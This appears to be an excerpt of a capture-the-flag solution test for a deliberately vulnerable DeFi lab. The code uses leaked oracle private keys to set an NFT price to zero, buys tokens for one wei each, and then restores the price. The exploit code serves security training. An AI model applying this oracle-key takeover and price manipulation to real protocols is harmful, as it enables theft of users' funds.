...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    const sourceAccounts = decodedData.map((key) => new ethers.Wallet(key, player.provider));

    // confirm that the created accounts belong to sources
    for (const account of sourceAccounts) {
      expect(sources).to.include(account.address);
    }
    ...
    for (const account of sourceAccounts) {
      await oracle.connect(account).postPrice("DVNFT", 0);
    }
    ...
    const tokenIds = [];
    for (let i = 0; i < 10; ++i) {
      await expect(exchange.connect(player).buyOne({ value: 1 }))
        .to.emit(exchange, "TokenBought") // check for event to record the tokenId
        .withArgs(player.address, (id) => tokenIds.push(id), 0);
    }

    // then, we will set the price back to the initial price, so that it stays the same
    for (const account of sourceAccounts) {
      await oracle.connect(account).postPrice("DVNFT", INITIAL_NFT_PRICE);
    }
